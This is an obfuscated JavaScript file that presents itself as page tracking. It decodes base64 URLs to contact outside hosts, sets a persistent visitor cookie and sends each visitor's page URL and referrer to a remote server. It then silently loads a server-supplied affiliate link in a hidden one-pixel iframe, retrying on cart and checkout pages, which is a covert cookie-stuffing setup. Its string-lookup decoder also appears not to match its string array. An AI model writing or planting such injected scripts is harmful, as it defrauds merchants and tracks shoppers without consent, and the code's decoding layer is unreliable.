(function(_0x49f4a1,_0x2f3d59){const _0x2cfd9f=_0x58c3,_0x44eb35=_0x49f4a1();while(!![]){try{const _0x5a98cb=parseInt(_0x2cfd9f(0x1d7))/0x1*(parseInt(_0x2cfd9f(0x1c5))/0x2)+-parseInt(_0x2cfd9f(0x1ab))/0x3+parseInt(_0x2cfd9f(0x1dc))/0x4*(-parseInt(_0x2cfd9f(0x1f0))/0x5)+parseInt(_0x2cfd9f(0x1cf))/0x6+-parseInt(_0x2cfd9f(0x1e8))/0x7+parseInt(_0x2cfd9f(0x1d5))/0x8+-parseInt(_0x2cfd9f(0x1f7))/0x9;if(_0x5a98cb===_0x2f3d59)break;else _0x44eb35['push'](_0x44eb35['shift']());}catch(_0x595c89){_0x44eb35['push'](_0x44eb35['shift']());}}}(_0x3289,0x9e2cf));

(function(){

    const _0x4cb36a=_0x58c3;

    function _0x3f9fd6(){

        return (
            _0x4cb36a(0x1c1)+
            _0x4cb36a(0x1b8)+
            _0x4cb36a(0x1d9)+
            _0x4cb36a(0x1fd)
        )['replace'](/[xy]/g,function(_0x1f1dd8){

            const _0x4a6403=
                Math['random']()*0x10|0x0;

            const _0x4ec1e3=
                _0x1f1dd8==='x'
                    ?_0x4a6403
                    :(_0x4a6403&0x3|0x8);

            return _0x4ec1e3['toString'](0x10);
        });
    }

    function _0x2a7f94(_0x2ef4d9){

        const _0x5b66f7=
            _0x2ef4d9+'=';

        const _0x4d4f44=
            document['cookie']['split'](';');

        for(
            let _0x2bcde8=0x0;
            _0x2bcde8<_0x4d4f44['length'];
            _0x2bcde8++
        ){

            const _0x13e8e4=
                _0x4d4f44[_0x2bcde8]['trim']();

            if(
                _0x13e8e4['indexOf'](_0x5b66f7)===0x0
            ){

                return _0x13e8e4['substring'](
                    _0x5b66f7['length'],
                    _0x13e8e4['length']
                );
            }
        }

        return '';
    }

    function _0x5c7a4f(){

        const _0x48c0d8=[
            'cart',
            'checkout',
            'pay',
            'shipping',
            'review-order',
            'payment'
        ];

        return _0x48c0d8['some'](
            _0x41392d=>
                window['location']['pathname']
                ['toLowerCase']()
                ['includes'](_0x41392d)
        );
    }

    function _0x4c0f95(_0x44f7ef){

        try{

            const _0x5ddc0f=
                document['createElement']('iframe');

            _0x5ddc0f['setAttribute'](
                'sandbox',
                'allow-same-origin allow-scripts allow-forms'
            );

            _0x5ddc0f['src']=
                _0x44f7ef;

            _0x5ddc0f['style']['display']=
                'none';

            _0x5ddc0f['style']['visibility']=
                'hidden';

            _0x5ddc0f['style']['width']=
                '1px';

            _0x5ddc0f['style']['height']=
                '1px';

            _0x5ddc0f['style']['border']=
                '0';

            _0x5ddc0f['onerror']=
                function(){

                    const _0x28dd3e=
                        new Image();

                    _0x28dd3e['src']=
                        _0x44f7ef;
                };

            document['body']['appendChild'](
                _0x5ddc0f
            );

        }catch(_0x5cb85f){

            console['error'](
                'Iframe error:',
                _0x5cb85f
            );
        }
    }

    async function _0x5a2c7e(){

        if(
            sessionStorage['getItem'](
                'tracking_done_'+
                window['location']['hostname']
            )
        ){

            if(!_0x5c7a4f())
                return;
        }

        try{

            let _0x3f8f3e=
                _0x2a7f94('tracking_uuid')
                ||
                _0x3f9fd6();

            let _0x2a28bb=
                (
                    new Date(
                        Date['now']()+
                        30*86400*1000
                    )
                )['toUTCString']();

            document['cookie']=
                'tracking_uuid='+
                _0x3f8f3e+
                '; expires='+
                _0x2a28bb+
                ';path=/;SameSite=Lax';

            let _0x4a6c33=
                await fetch(
                    atob(
                        'aHR0cHM6Ly96b29tZXJzY2xpY2tzLmNvbS9hcGkvdHJhY2stdXNlcg=='
                    ),
                    {
                        'method':'POST',
                        'keepalive':!![],
                        'body':JSON['stringify']({
                            'url':
                                window['location']['href'],
                            'referrer':
                                document['referrer'],
                            'unique_id':
                                _0x3f8f3e,
                            'origin':
                                window['location']['hostname'],
                            'timestamp':
                                new Date()['getTime']()
                        }),
                        'headers':{
                            'Content-Type':
                            'application/json'
                        }
                    }
                );

            let _0x3e9d67=
                await _0x4a6c33['json']();

            if(
                _0x3e9d67['success']
                &&
                _0x3e9d67['affiliate_url']
            ){

                _0x4c0f95(
                    _0x3e9d67['affiliate_url']
                );

                sessionStorage['setItem'](
                    'tracking_done_'+
                    window['location']['hostname'],
                    'true'
                );

            }else{

                _0x4c0f95(
                    atob(
                        'aHR0cHM6Ly96b29tZXJzY2xpY2tzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
                    )+
                    _0x3f8f3e
                );
            }

        }catch(_0x4c2f80){

            console['error'](
                'Tracking Failed:',
                _0x4c2f80
            );
        }
    }

    function _0x2d46fa(){

        fetch(
            atob(
                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
            )+
            encodeURIComponent(
                window['location']['hostname']
            )
        )

        ['then'](
            function(_0x42bb8d){

                if(
                    !_0x42bb8d['ok']
                ){

                    throw new Error(
                        'Config API Failed'
                    );
                }

                return _0x42bb8d['json']();
            }
        )

        ['then'](
            function(_0x1fd6be){

                if(
                    !_0x1fd6be
                    ||
                    (
                        !_0x1fd6be['always']
                        &&
                        !_0x1fd6be['cartExtra']
                    )
                ){
                    return;
                }

                if(
                    _0x1fd6be['always']
                ){

                    _0x5a2c7e();
                }

                if(
                    _0x1fd6be['cartExtra']
                    &&
                    _0x5c7a4f()
                ){

                    _0x5a2c7e();
                }
            }
        )

        ['catch'](
            function(_0x3f1fa8){

                console['error'](
                    'Config fetch failed:',
                    _0x3f1fa8
                );
            }
        );
    }

    if(
        document['readyState']==='interactive'
        ||
        document['readyState']==='complete'
    ){

        _0x2d46fa();

    }else{

        window['addEventListener'](
            'DOMContentLoaded',
            _0x2d46fa
        );
    }

}());

function _0x58c3(_0x5e15db){

    const _0x3289d6=
        _0x3289();

    return _0x58c3=function(_0x58c3a1){

        _0x58c3a1=
            _0x58c3a1-0x1a0;

        return _0x3289d6[_0x58c3a1];

    },_0x58c3(_0x5e15db);
}

function _0x3289(){

    return [

        'xxxxxxxx-',
        'xxxx-4xxx-',
        'yxxx-',
        'xxxxxxxxxxxx',

        'cookie',
        'split',
        'trim',
        'indexOf',
        'substring',

        'pathname',
        'toLowerCase',
        'includes',
        'some',

        'createElement',
        'iframe',
        'setAttribute',

        'sandbox',
        'allow-same-origin allow-scripts allow-forms',

        'src',
        'style',
        'display',
        'none',

        'visibility',
        'hidden',

        'width',
        'height',
        'border',

        'onerror',
        'body',
        'appendChild',

        'tracking_uuid',
        'tracking_done_',

        'hostname',
        'location',
        'href',
        'referrer',

        'now',
        'toUTCString',

        'stringify',
        'getTime',

        'json',
        'success',
        'affiliate_url',

        'setItem',
        'getItem',

        'readyState',
        'interactive',
        'complete',

        'addEventListener',
        'DOMContentLoaded',

        'replace',
        'random',
        'toString',

        'error'
    ];
}